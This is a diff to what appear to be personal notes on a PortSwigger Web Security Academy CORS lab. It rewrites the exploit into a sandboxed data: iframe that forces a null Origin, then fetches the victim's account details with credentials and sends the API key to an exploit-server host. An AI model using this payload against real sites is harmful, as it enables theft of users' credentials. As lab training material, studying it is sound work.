@@ -44,13 +44,18 @@ Check the logs
 https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
 
 ```
-<div>Your API Key is: <span id=apikey></span></div>
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Origin: null
+```
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<div>Your API Key is: <span id=apikey></span></div>
 <script>
-    var MAINURL = "https://acc11fe11f302f78c122262b0074007b.web-security-academy.net";
-    var EXPURL = "https://exploit-ac7f1f1f1ff02f3dc1f0264b01b200f2.web-security-academy.net";
-    fetch(MAINURL+'/accountDetails', {credentials:'include'})
+    var EXPURL = 'https://exploit-0a2c002303c92b3ac0d4089b01ae000c.web-security-academy.net/';
+    fetch('https://0aa300da033a2b7dc010085d009c003c.web-security-academy.net/accountDetails', {credentials:'include'})
         .then(r => r.json())
         .then(j => fetch(EXPURL+'/'+j.apikey, {credentials:'include'}))
-</script>
+</script>"></iframe>
 ```
 
